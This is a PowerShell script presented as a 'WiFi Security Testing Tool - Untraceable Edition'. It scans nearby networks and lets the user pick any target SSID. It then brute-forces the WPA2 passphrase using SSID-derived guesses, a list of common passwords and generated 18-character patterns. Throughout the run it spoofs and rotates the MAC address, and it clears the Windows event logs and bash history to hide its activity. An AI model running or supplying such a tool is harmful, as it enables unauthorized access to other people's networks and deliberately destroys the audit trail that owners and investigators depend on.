<#
.SYNOPSIS
    WiFi Security Testing Tool - Untraceable Edition
#>

[CmdletBinding()]
param(
    [ValidateSet("standard", "stealth", "aggressive", "ghost")]
    [string]$Mode = "ghost",
    
    [int]$HexPasswordCount = 5000
)

$ErrorActionPreference = "Stop"
$ProgressPreference = "Continue"

# ============================================
# OS DETECTION
# ============================================

$Global:OS_TYPE = "Unknown"
$Global:OS_NAME = "Unknown"

function Initialize-OSDetection {
    if ($env:OS -eq "Windows_NT" -or $IsWindows) {
        $Global:OS_TYPE = "Windows"
        $Global:OS_NAME = "Windows"
        
        if ([System.Environment]::OSVersion.Version.Major -eq 10) {
            if ([System.Environment]::OSVersion.Version.Build -ge 22000) {
                $Global:OS_NAME = "Windows 11"
            } else {
                $Global:OS_NAME = "Windows 10"
            }
        }
        return
    }
    
    if ($IsLinux -or $PSVersionTable.Platform -eq "Unix") {
        $Global:OS_TYPE = "Linux"
        
        if (Test-Path "/etc/os-release") {
            $content = Get-Content "/etc/os-release" -Raw
            if ($content -match 'PRETTY_NAME="([^"]+)"') {
                $Global:OS_NAME = $matches[1]
            }
        }
        return
    }
    
    if ($IsMacOS) {
        $Global:OS_TYPE = "macOS"
        $Global:OS_NAME = "macOS"
        return
    }
}

Initialize-OSDetection

# ============================================
# CONFIGURATION
# ============================================

$Global:Config = @{
    Mode = $Mode
    GhostMode = ($Mode -eq "ghost")
    StealthMode = ($Mode -eq "stealth" -or $Mode -eq "ghost")
    Interface = $null
    OriginalMac = $null
}

# ============================================
# UTILITY FUNCTIONS
# ============================================

function Clear-SystemTraces {
    try {
        if ($Global:OS_TYPE -eq "Windows") {
            wevtutil cl Security 2>$null
            wevtutil cl System 2>$null
            wevtutil cl Application 2>$null
            ipconfig /flushdns | Out-Null
        } 
        elseif ($Global:OS_TYPE -eq "Linux" -or $Global:OS_TYPE -eq "macOS") {
            Remove-Item ~/.bash_history -Force -ErrorAction SilentlyContinue 2>$null
        }
    } catch {}
}

function Get-NetworkAdapters {
    $adapters = @()
    
    try {
        if ($Global:OS_TYPE -eq "Windows") {
            # Method 1: Get-NetAdapter
            try {
                $netAdapters = Get-NetAdapter -ErrorAction SilentlyContinue | Where-Object { 
                    $_.MediaType -match "802.11" -or 
                    $_.InterfaceDescription -match "wireless|wifi|wi-fi|wlan" -or
                    $_.Name -match "wifi|wi-fi|wlan|wireless"
                }
                
                if ($netAdapters) {
                    foreach ($adapter in $netAdapters) {
                        $adapters += [PSCustomObject]@{
                            Name = $adapter.Name
                            Description = $adapter.InterfaceDescription
                            Status = $adapter.Status
                            MacAddress = $adapter.MacAddress
                            GUID = $adapter.InterfaceGuid
                        }
                    }
                }
            } catch {}
            
            # Method 2: netsh fallback - PARSING CORRIGÉ
            if ($adapters.Count -eq 0) {
                try {
                    $netshOutput = netsh wlan show interfaces 2>&1 | Out-String
                    if ($netshOutput -notmatch "There is no wireless" -and $netshOutput -notmatch "Aucune interface") {
                        $lines = $netshOutput -split "`r?`n"
                        
                        for ($i = 0; $i -lt $lines.Count; $i++) {
                            $line = $lines[$i]
                            if ($line -match "^\s*Name\s*:\s*(.+)$" -or 
                                $line -match "^\s*Nom\s*:\s*(.+)$" -or
                                $line -match "^\s*Interface\s*:\s*(.+)$") {
                                
                                $interfaceName = $matches[1].Trim()
                                
                                if (-not [string]::IsNullOrWhiteSpace($interfaceName) -and $interfaceName -ne "Name" -and $interfaceName -ne "Nom") {
                                    $adapters += [PSCustomObject]@{
                                        Name = $interfaceName
                                        Description = "Wireless Adapter (netsh)"
                                        Status = "Unknown"
                                        MacAddress = "Unknown"
                                        GUID = "Unknown"
                                    }
                                    break
                                }
                            }
                        }
                    }
                } catch {}
            }
            
            # Method 3: wmic fallback
            if ($adapters.Count -eq 0) {
                try {
                    $wmicOutput = wmic nic where "NetConnectionID like '%Wireless%' or NetConnectionID like '%Wi-Fi%'" get NetConnectionID /value 2>$null | Out-String
                    if ($wmicOutput) {
                        $lines = $wmicOutput -split "`r?`n"
                        foreach ($line in $lines) {
                            if ($line -match "NetConnectionID=(.+)$") {
                                $name = $matches[1].Trim()
                                if (-not [string]::IsNullOrWhiteSpace($name)) {
                                    $adapters += [PSCustomObject]@{
                                        Name = $name
                                        Description = "Wireless Adapter (wmic)"
                                        Status = "Unknown"
                                        MacAddress = "Unknown"
                                        GUID = "Unknown"
                                    }
                                }
                            }
                        }
                    }
                } catch {}
            }
        }
        elseif ($Global:OS_TYPE -eq "Linux") {
            $interfaces = iw dev 2>$null | Select-String "Interface" | ForEach-Object { 
                ($_ -split "\s+")[1] 
            }
            
            if (-not $interfaces) {
                $interfaces = iwconfig 2>$null | Select-String "IEEE 802.11" | ForEach-Object { 
                    ($_ -split "\s+")[0] 
                }
            }
            
            foreach ($iface in $interfaces) {
                if ([string]::IsNullOrWhiteSpace($iface)) { continue }
                
                $mac = ""
                try { 
                    $macFile = "/sys/class/net/$iface/address"
                    if (Test-Path $macFile) {
                        $mac = (Get-Content $macFile -ErrorAction SilentlyContinue).Trim() 
                    }
                } catch {}
                
                $adapters += [PSCustomObject]@{
                    Name = $iface
                    Description = "Wireless Interface"
                    Status = "Unknown"
                    MacAddress = $mac
                    GUID = $iface
                }
            }
        }
        elseif ($Global:OS_TYPE -eq "macOS") {
            $adapters += [PSCustomObject]@{
                Name = "en0"
                Description = "Wi-Fi"
                Status = "Unknown"
                MacAddress = ""
                GUID = "en0"
            }
        }
    }
    catch {}
    
    if ($null -eq $adapters) {
        $adapters = @()
    }
    
    return $adapters
}

function Set-RandomMac {
    param(
        [string]$Interface,
        [string]$MacAddress = $null   # Si null => aléatoire ; sinon, valeur imposée (restauration)
    )
    
    # Variable de statut : on ne fait JAMAIS de return dans un finally
    $result = $false
    
    try {
        if ($Global:OS_TYPE -eq "Windows") {
            # Vérifie que la carte existe
            $adapterBefore = Get-NetAdapter -Name $Interface -ErrorAction SilentlyContinue
            if (-not $adapterBefore) {
                Write-Host "  [WARN] Adapter '$Interface' introuvable" -ForegroundColor Yellow
                return $false
            }
            
            $disabled = $false
            $enableFailed = $false
            
            try {
                # Désactivation avec ErrorAction Stop pour bien capturer l'échec
                Disable-NetAdapter -Name $Interface -Confirm:$false -ErrorAction Stop
                $disabled = $true
                Start-Sleep -Seconds 2
                
                # Calcul du MAC cible
                if (-not $MacAddress) {
                    $bytes = [byte[]]::new(6)
                    (New-Object System.Security.Cryptography.RNGCryptoServiceProvider).GetBytes($bytes)
                    $bytes[0] = [byte](($bytes[0] -band 0xFE) -bor 0x02)
                    $MacAddress = ($bytes | ForEach-Object { $_.ToString("X2") }) -join ":"
                }
                
                # Modification du registre
                $adapter = Get-NetAdapter -Name $Interface -ErrorAction SilentlyContinue
                if ($adapter) {
                    $regPath = "HKLM:\SYSTEM\CurrentControlSet\Control\Class\{4D36E972-E325-11CE-BFC1-08002BE10318}"
                    $subKeys = Get-ChildItem $regPath -ErrorAction SilentlyContinue | Where-Object { 
                        $props = Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue
                        $props -and $props.NetCfgInstanceId -eq $adapter.InterfaceGuid 
                    }
                    
                    if ($subKeys) {
                        $targetKey = if ($subKeys -is [array]) { $subKeys[0].PSPath } else { $subKeys.PSPath }
                        
                        # Si on restaure un MAC vide/Unknown => on supprime la clé NetworkAddress
                        if ([string]::IsNullOrWhiteSpace($MacAddress) -or $MacAddress -eq "Unknown") {
                            Remove-ItemProperty -Path $targetKey -Name "NetworkAddress" -Force -ErrorAction SilentlyContinue
                        } else {
                            Set-ItemProperty -Path $targetKey -Name "NetworkAddress" `
                                -Value $MacAddress.Replace(":", "") -Force -ErrorAction SilentlyContinue
                        }
                    }
                }
            }
            finally {
                # TOUJOURS réactiver, même en cas d'exception
                # PAS de return ici : on met à jour $enableFailed à la place
                if ($disabled) {
                    try {
                        Enable-NetAdapter -Name $Interface -Confirm:$false -ErrorAction Stop
                        Start-Sleep -Seconds 3
                    } catch {
                        Write-Host "  [ERROR] Impossible de réactiver la carte '$Interface': $_" -ForegroundColor Red
                        $enableFailed = $true
                    }
                }
            }
            
            if ($enableFailed) {
                return $false
            }
            
            # Vérification post-enable
            $adapterAfter = Get-NetAdapter -Name $Interface -ErrorAction SilentlyContinue
            if ($adapterAfter -and $adapterAfter.Status -ne "Disabled") {
                return $true
            }
            return $false
        }
        elseif ($Global:OS_TYPE -eq "Linux") {
            sudo ip link set $Interface down 2>$null
            Start-Sleep -Seconds 1
            
            try {
                if (-not $MacAddress -or $MacAddress -eq "Unknown") {
                    $bytes = [byte[]]::new(6)
                    (New-Object System.Security.Cryptography.RNGCryptoServiceProvider).GetBytes($bytes)
                    $bytes[0] = [byte](($bytes[0] -band 0xFE) -bor 0x02)
                    $MacAddress = ($bytes | ForEach-Object { $_.ToString("X2") }) -join ":"
                }
                sudo ip link set $Interface address $MacAddress 2>$null
            }
            finally {
                # PAS de return ici
                sudo ip link set $Interface up 2>$null
                Start-Sleep -Seconds 2
            }
            
            return $true
        }
        elseif ($Global:OS_TYPE -eq "macOS") {
            # macOS : MAC spoofing nécessite des outils tiers (spoof-mac)
            return $true
        }
    }
    catch {
        Write-Host "  [ERROR] Set-RandomMac: $_" -ForegroundColor Red
        # Tentative de secours : réactiver coûte que coûte
        try { 
            Enable-NetAdapter -Name $Interface -Confirm:$false -ErrorAction SilentlyContinue 
        } catch {}
        return $false
    }
    
    return $result
}

function Get-WifiNetworks {
    $networks = [System.Collections.Generic.List[hashtable]]::new()
    
    try {
        if ($Global:OS_TYPE -eq "Windows") {
            for ($i = 0; $i -lt 2; $i++) {
                netsh wlan scan interface="$($Global:Config.Interface)" 2>&1 | Out-Null
                Start-Sleep -Seconds 2
            }
            
            $output = netsh wlan show networks interface="$($Global:Config.Interface)" mode=Bssid 2>&1
            
            $current = $null
            foreach ($line in $output) {
                $trimmed = $line.Trim()
                if ([string]::IsNullOrWhiteSpace($trimmed)) { continue }
                
                if ($trimmed -match "^SSID\s+\d+\s*:\s*(.+)$") {
                    if ($current -and $current.SSID) { 
                        [void]$networks.Add($current) 
                    }
                    
                    $current = @{
                        SSID = $matches[1].Trim() -replace '[\x00-\x1F\x7F]', ''
                        Security = "Unknown"
                        Signal = 0
                    }
                }
                elseif ($current) {
                    if ($trimmed -match "Authentication\s*:\s*(.+)") {
                        $current.Security = $matches[1].Trim()
                    }
                    elseif ($trimmed -match "Signal\s*:\s*(\d+)") {
                        $current.Signal = [int]$matches[1].Trim()
                    }
                }
            }
            
            if ($current -and $current.SSID) { 
                [void]$networks.Add($current) 
            }
        }
        elseif ($Global:OS_TYPE -eq "Linux") {
            $iface = $Global:Config.Interface
            $scan = sudo iw dev $iface scan 2>$null | Out-String
            
            if (-not $scan) {
                $scan = sudo iwlist $iface scan 2>$null | Out-String
            }
            
            if ($scan) {
                $cells = $scan -split "(?=(BSS|Cell) [0-9a-f]{2}:)"
                foreach ($cell in $cells) {
                    if ($cell -match "SSID:\s*(.+)") {
                        $ssid = $matches[1].Trim()
                        if ([string]::IsNullOrWhiteSpace($ssid) -or $ssid -eq "\x00") { continue }
                        
                        $signal = 0
                        if ($cell -match "signal:\s*(-?\d+)") {
                            $signal = [Math]::Min(100, [Math]::Max(0, 2 * ([int]$matches[1] + 100)))
                        }
                        
                        $sec = "Open"
                        if ($cell -match "RSN") { $sec = "WPA2" }
                        elseif ($cell -match "WPA") { $sec = "WPA" }
                        
                        [void]$networks.Add(@{
                            SSID = $ssid
                            Security = $sec
                            Signal = $signal
                        })
                    }
                }
            }
        }
    }
    catch {}
    
    return @($networks | Where-Object { $_.Signal -ge 1 } | Sort-Object -Property Signal -Descending)
}

function Test-Password {
    param([string]$SSID, [string]$Password, [string]$Interface)
    
    try {
        if ($Global:OS_TYPE -eq "Windows") {
            $profileName = "T_$(Get-Random)"
            
            $xml = @"
<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>$profileName</name>
    <SSIDConfig><SSID><name>$([Security.SecurityElement]::Escape($SSID))</name></SSID></SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>manual</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>$([Security.SecurityElement]::Escape($Password))</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
</WLANProfile>
"@
            
            $tempFile = [System.IO.Path]::GetTempFileName()
            $xml | Out-File -FilePath $tempFile -Encoding UTF8
            
            netsh wlan add profile filename="$tempFile" interface="$Interface" | Out-Null
            netsh wlan connect name="$profileName" interface="$Interface" | Out-Null
            
            Start-Sleep -Milliseconds 2500
            
            $info = netsh wlan show interfaces interface="$Interface" | Out-String
            $success = ($info -match "State\s+:\s+connected" -and $info -match "SSID\s+:\s+$([regex]::Escape($SSID))")
            
            netsh wlan delete profile name="$profileName" | Out-Null
            Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
            
            return $success
        }
        elseif ($Global:OS_TYPE -eq "Linux") {
            $connName = "temp_$(Get-Random)"
            sudo nmcli connection add type wifi con-name $connName ifname $Interface ssid $SSID wifi-sec.key-mgmt wpa-psk wifi-sec.psk $Password 2>&1 | Out-Null
            sudo nmcli connection up $connName 2>&1 | Out-Null
            Start-Sleep -Milliseconds 2000
            
            $active = sudo nmcli connection show --active | Select-String $connName
            sudo nmcli connection delete $connName 2>&1 | Out-Null
            
            return ($active -ne $null)
        }
        
        return $false
    }
    catch {
        return $false
    }
}

# ============================================
# PASSWORD GENERATION
# ============================================

function Get-SSIDPasswords {
    param([string]$SSID)
    
    $passwords = @()
    if ([string]::IsNullOrWhiteSpace($SSID)) { return $passwords }
    
    $clean = $SSID.Trim()
    $lower = $clean.ToLower()
    $words = $clean -split '[-_\s]+'
    $first = $words[0]
    
    $patterns = @(
        $clean, $lower, "$clean`123", "$clean`1234", "$clean`2024",
        "$lower`123", "$lower`1234", "$lower`2024", "$first`123",
        "$first`1234", "$first`2024", "$first`wifi", "$first`password",
        "wifi$clean", "$clean`wifi", "$clean`password", "$clean`admin",
        "$clean-123", "$clean-2024", "$clean_123", "$first-123",
        "$first-2024", "$clean`01", "$clean`001", "$clean`999",
        "$first`123456", "$first`password", "$first`qwerty", "$first`abc123"
    )
    
    foreach ($p in $patterns) {
        if ($p.Length -ge 8 -and $p.Length -le 63 -and $p -notin $passwords) {
            $passwords += $p
        }
    }
    
    return $passwords
}

function Get-CommonPasswords {
    return @(
        "12345678", "123456789", "1234567890", "password", "password123",
        "qwerty123", "abc12345", "letmein1", "welcome1", "monkey123",
        "dragon123", "master123", "sunshine", "princess", "admin1234",
        "login1234", "welcome123", "password1", "1234qwer", "qwertyuiop",
        "123456789a", "super123", "hello123", "freedom1", "whatever",
        "qazwsx123", "trustno1", "baseball", "football", "iloveyou",
        "computer", "starwars", "pokemon1", "hello1234", "adminadmin",
        "admin12345", "useruser12", "support123", "default1", "guest1234",
        "wireless", "wireless123", "wifi12345", "internet1", "broadband",
        "home1234", "mywifi123", "network1", "connect1", "online123",
        "11111111", "22222222", "33333333", "44444444", "55555555",
        "66666666", "77777777", "88888888", "99999999", "00000000",
        "12121212", "12312312", "11223344", "98765432", "87654321",
        "qwerty12", "asdfgh12", "zxcvbn12", "1q2w3e4r", "qazwsx12",
        "20242024", "20232023", "20222022", "password12", "password13",
        "secret1234", "mypassword", "default123", "changeme1", "home12345",
        "house123", "office12", "work1234", "family123", "love1234",
        "internet12", "tech1234", "digital1", "smart123", "phone123",
        "password123456", "123456789012", "qwerty123456", "letmein12345",
        "welcome12345", "monkey123456", "dragon123456", "master123456",
        "sunshine1234", "princess1234", "football12", "baseball12",
        "iloveyou1234", "trustno123", "whatever123", "password1234",
        "1234password", "mypassword123", "welcome1234", "password!",
        "P@ssw0rd", "P@ssw0rd123", "Pass1234", "Password1", "Admin123",
        "root1234", "toor1234", "guest123", "user1234", "test1234",
        "demo1234", "temp1234", "pass1234", "key12345", "access12"
    ) | Select-Object -Unique
}

function Get-18CharPatterns {
    $patterns = @()
    
    $prefixes = @("2TFG", "2TFH", "2TFJ", "3AFG", "2UFG", "A4B8", "001F", "0024")
    $middles = @("3AQ7", "3AR7", "3BQ7", "4AQ7", "3AP7", "3AQ8")
    $centers = @("2NZH", "2NZJ", "2NYH", "3NZH", "2NZG", "2MZH")
    $suffixes = @("5CCAGX", "5CCAGY", "5CDAGX", "5CCAHX", "5CCAGZ", "5DCAGX")
    
    foreach ($pre in $prefixes) {
        foreach ($mid in $middles) {
            foreach ($cen in $centers) {
                foreach ($suf in $suffixes) {
                    $pass = "$pre$mid$cen$suf"
                    if ($pass -notin $patterns) {
                        $patterns += $pass
                    }
                }
            }
        }
    }
    
    $hex = "0123456789ABCDEF"
    for ($i = 0; $i -lt 1000; $i++) {
        $pass = -join ((1..18) | ForEach-Object { $hex[(Get-Random -Maximum 16)] })
        if ($pass -notin $patterns) {
            $patterns += $pass
        }
    }
    
    return $patterns
}

# ============================================
# MAIN
# ============================================

function Start-Test {
    try {
        Clear-SystemTraces
        
        Write-Host ""
        Write-Host "===============================================================" -ForegroundColor Cyan
        Write-Host "    WiFi Security Testing Tool - Untraceable Edition" -ForegroundColor Cyan
        Write-Host "===============================================================" -ForegroundColor Cyan
        Write-Host "  OS: $($Global:OS_NAME)" -ForegroundColor White
        Write-Host "  Mode: $($Global:Config.Mode)" -ForegroundColor White
        Write-Host "===============================================================" -ForegroundColor Cyan
        Write-Host ""
        
        # Admin check
        $isAdmin = $false
        if ($Global:OS_TYPE -eq "Windows") {
            $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
            $principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
            $isAdmin = $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
        } else {
            $isAdmin = ((id -u) -eq 0)
        }
        
        if (-not $isAdmin) {
            Write-Host "[ERROR] Administrator/root rights required" -ForegroundColor Red
            return
        }
        
        # ============================================
        # GET WIFI ADAPTERS
        # ============================================
        Write-Host "[INFO] Detecting network adapters..." -ForegroundColor Yellow
        
        $adapters = @(Get-NetworkAdapters)
        
        if ($adapters.Count -eq 0) {
            Write-Host ""
            Write-Host "[ERROR] No wireless adapters detected!" -ForegroundColor Red
            Write-Host ""
            Write-Host "[DEBUG] Windows network adapters:" -ForegroundColor Yellow
            
            try {
                Get-NetAdapter |
                    Select-Object Name, InterfaceDescription, Status, MediaType |
                    Format-Table -AutoSize
            }
            catch {
                Write-Host "[ERROR] Unable to query Get-NetAdapter." -ForegroundColor Red
            }
            
            Write-Host ""
            Write-Host "[INFO] Check that:" -ForegroundColor Yellow
            Write-Host "  - Wi-Fi is enabled"
            Write-Host "  - The Wi-Fi driver is installed"
            Write-Host "  - Windows recognizes the wireless adapter"
            Write-Host ""
            
            $manualName = Read-Host "Enter WiFi interface name (e.g., 'Wi-Fi' or 'wlan0') or press Enter to exit"
            
            if ([string]::IsNullOrWhiteSpace($manualName)) {
                Write-Host "[EXIT] No adapter selected. Exiting." -ForegroundColor Yellow
                return
            }
            
            $adapters = @([PSCustomObject]@{
                Name = $manualName
                Description = "Manual Entry"
                Status = "Unknown"
                MacAddress = "Unknown"
                GUID = "Manual"
            })
        }
        
        Write-Host ""
        Write-Host "[ADAPTERS] Found $($adapters.Count) wireless adapter(s):" -ForegroundColor Cyan
        
        for ($i = 0; $i -lt $adapters.Count; $i++) {
            $adapter = $adapters[$i]
            
            $statusColor = if ($adapter.Status -eq "Up") {
                "Green"
            } else {
                "Yellow"
            }
            
            Write-Host "  [$i] $($adapter.Name)" -ForegroundColor White -NoNewline
            
            if ($adapter.Description -and $adapter.Description -ne "Manual Entry") {
                Write-Host " - $($adapter.Description)" -ForegroundColor Gray -NoNewline
            }
            
            Write-Host " [$($adapter.Status)]" -ForegroundColor $statusColor
        }
        
        # ============================================
        # ADAPTER SELECTION
        # ============================================
        
        $validSelection = $false
        $selectedIndex = -1
        $maxIndex = [math]::Max(0, $adapters.Count - 1)
        
        do {
            Write-Host ""
            $sel = Read-Host "Select adapter number (0-$maxIndex)"
            
            if ($sel -match '^\d+$') {
                $candidate = [int]$sel
                if ($candidate -ge 0 -and $candidate -lt $adapters.Count) {
                    $selectedIndex = $candidate
                    $validSelection = $true
                }
                else {
                    Write-Host "[ERROR] Number must be between 0 and $maxIndex" -ForegroundColor Red
                }
            }
            else {
                Write-Host "[ERROR] Please enter a number." -ForegroundColor Red
            }
        } while (-not $validSelection)
        
        $adapter = $adapters[$selectedIndex]
        
        $Global:Config.Interface = $adapter.Name
        $Global:Config.OriginalMac = $adapter.MacAddress
        
        Write-Host ""
        Write-Host "[SELECTED] Using adapter: $($adapter.Name)" -ForegroundColor Green
        
        # ============================================
        # CHANGE MAC
        # ============================================
        Write-Host "`n[ANON] Changing MAC address..." -ForegroundColor Cyan
        if (Set-RandomMac -Interface $adapter.Name) {
            Write-Host "  [OK] MAC changed successfully" -ForegroundColor Green
        } else {
            Write-Host "  [WARN] MAC change failed, continuing..." -ForegroundColor Yellow
        }
        
        # ============================================
        # SCAN
        # ============================================
        Write-Host "`n[SCAN] Scanning for WiFi networks..." -ForegroundColor Yellow
        $networks = Get-WifiNetworks
        
        if ($networks.Count -eq 0) {
            Write-Host "[ERROR] No networks found" -ForegroundColor Red
            return
        }
        
        Write-Host "`n[NETWORKS] Found $($networks.Count) networks:" -ForegroundColor Green
        for ($i = 0; $i -lt $networks.Count; $i++) {
            $signalColor = if ($networks[$i].Signal -ge 70) { "Green" } elseif ($networks[$i].Signal -ge 40) { "Yellow" } else { "Red" }
            Write-Host "  [$i] " -NoNewline
            Write-Host "$($networks[$i].SSID)" -ForegroundColor White -NoNewline
            Write-Host " (Signal: " -NoNewline
            Write-Host "$($networks[$i].Signal)%" -ForegroundColor $signalColor -NoNewline
            Write-Host ", Security: $($networks[$i].Security))"
        }
        
        # ============================================
        # TARGET SELECTION
        # ============================================
        $validTarget = $false
        $targetIndex = -1
        $maxNetwork = [math]::Max(0, $networks.Count - 1)
        
        do {
            Write-Host ""
            $sel = Read-Host "Select target network (0-$maxNetwork)"
            
            if ($sel -match '^\d+$') {
                $targetIndex = [int]$sel
                if ($targetIndex -ge 0 -and $targetIndex -lt $networks.Count) {
                    $validTarget = $true
                } else {
                    Write-Host "[ERROR] Number must be between 0 and $maxNetwork" -ForegroundColor Red
                }
            } else {
                Write-Host "[ERROR] Invalid input. Please enter a number." -ForegroundColor Red
            }
        } while (-not $validTarget)
        
        $target = $networks[$targetIndex]
        Write-Host "`n[TARGET] Selected: $($target.SSID)" -ForegroundColor Cyan
        
        # ============================================
        # GENERATE PASSWORDS
        # ============================================
        Write-Host "`n[GENERATING] Creating password lists..." -ForegroundColor Yellow
        
        Write-Host "  [1/3] SSID-based passwords..." -ForegroundColor Gray
        $p1 = Get-SSIDPasswords -SSID $target.SSID
        
        Write-Host "  [2/3] Common world passwords..." -ForegroundColor Gray
        $p2 = Get-CommonPasswords
        
        Write-Host "  [3/3] 18-character patterns..." -ForegroundColor Gray
        $p3 = Get-18CharPatterns
        
        $allPasswords = @()
        $allPasswords += $p1
        $allPasswords += $p2 | Where-Object { $_ -notin $allPasswords }
        $allPasswords += $p3 | Where-Object { $_ -notin $allPasswords }
        
        Write-Host "`n[READY] Total unique passwords: $($allPasswords.Count)" -ForegroundColor Green
        Write-Host "[INFO] Order: 1) SSID-based, 2) Common, 3) 18-char patterns" -ForegroundColor Gray
        Write-Host "[INFO] Press 'Q' to stop, 'R' to rotate MAC`n" -ForegroundColor Yellow
        
        # ============================================
        # TEST LOOP
        # ============================================
        $startTime = Get-Date
        $tested = 0
        $phase = "PHASE 1/3"
        $phaseName = "SSID-BASED"
        
        for ($i = 0; $i -lt $allPasswords.Count; $i++) {
            $password = $allPasswords[$i]
            $tested++
            
            if ($i -eq $p1.Count) { 
                $phase = "PHASE 2/3"
                $phaseName = "COMMON"
                Write-Host "`n[$phase] Testing common world passwords..." -ForegroundColor Cyan
            }
            elseif ($i -eq ($p1.Count + $p2.Count)) {
                $phase = "PHASE 3/3"
                $phaseName = "18CHAR-PATTERN"
                Write-Host "`n[$phase] Testing 18-character patterns..." -ForegroundColor Cyan
            }
            
            if ($i % 5 -eq 0 -or $i -eq 0) {
                $percent = [math]::Min(($i / $allPasswords.Count) * 100, 100)
                Write-Progress -Activity "[$phaseName] Testing passwords" -Status $password -PercentComplete $percent
            }
            
            if ([Console]::KeyAvailable) {
                $key = [Console]::ReadKey($true)
                if ($key.Key -eq 'Q') { 
                    Write-Host "`n[STOP] User interrupted testing" -ForegroundColor Yellow
                    break 
                }
                if ($key.Key -eq 'R') {
                    Write-Host "`n[ANON] Rotating MAC address..." -ForegroundColor Cyan
                    Set-RandomMac -Interface $Global:Config.Interface | Out-Null
                }
            }
            
            if ($Global:Config.GhostMode -and ($tested % 10 -eq 0) -and ($tested -gt 0)) {
                Set-RandomMac -Interface $Global:Config.Interface | Out-Null
            }
            
            $success = Test-Password -SSID $target.SSID -Password $password -Interface $Global:Config.Interface
            
            if ($success) {
                $elapsed = (Get-Date) - $startTime
                
                Write-Host "`n`n[SUCCESS] ==========================================" -ForegroundColor Green
                Write-Host "  PASSWORD FOUND!" -ForegroundColor Green
                Write-Host "  SSID: $($target.SSID)" -ForegroundColor White
                Write-Host "  Password: $password" -ForegroundColor Green
                Write-Host "  Phase: $phaseName" -ForegroundColor Cyan
                Write-Host "  Time: $($elapsed.ToString('mm\:ss'))" -ForegroundColor Gray
                Write-Host "  Tested: $tested of $($allPasswords.Count)" -ForegroundColor Gray
                Write-Host "========================================== [SUCCESS]" -ForegroundColor Green
                
                # Le finally s'occupera de la restauration
                return
            }
        }
        
        Write-Host "`n[RESULT] Password not found" -ForegroundColor Red
        Write-Host "  Total tested: $($allPasswords.Count) passwords" -ForegroundColor Gray
        
    }
    catch {
        Write-Host "`n[ERROR] $_" -ForegroundColor Red
        Write-Host $_.ScriptStackTrace -ForegroundColor Gray
    }
    finally {
        # ============================================
        # RESTAURATION FINALE
        # ============================================
        Clear-SystemTraces
        
        if ($Global:Config.Interface -and $Global:Config.OriginalMac) {
            Write-Host "`n[RESTORE] Restauration du MAC original ($($Global:Config.OriginalMac))..." -ForegroundColor Cyan
            
            $ok = Set-RandomMac -Interface $Global:Config.Interface -MacAddress $Global:Config.OriginalMac
            
            if ($ok) {
                Write-Host "  [OK] MAC restauré et carte réactivée" -ForegroundColor Green
            } else {
                Write-Host "  [WARN] Restauration MAC échouée, tentative de réactivation seule..." -ForegroundColor Yellow
                try {
                    Enable-NetAdapter -Name $Global:Config.Interface -Confirm:$false -ErrorAction SilentlyContinue
                } catch {}
            }
        }
        elseif ($Global:Config.Interface) {
            # Pas de MAC original connu => au moins réactiver
            Write-Host "`n[RESTORE] Réactivation de la carte..." -ForegroundColor Cyan
            try {
                Enable-NetAdapter -Name $Global:Config.Interface -Confirm:$false -ErrorAction SilentlyContinue
                Write-Host "  [OK] Carte réactivée" -ForegroundColor Green
            } catch {}
        }
        
        Write-Host "`n[DONE] Press any key to exit..." -ForegroundColor Cyan
        $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    }
}

try {
    $proc = Get-Process -Id $PID
    $proc.PriorityClass = [System.Diagnostics.ProcessPriorityClass]::High
} catch {}

Start-Test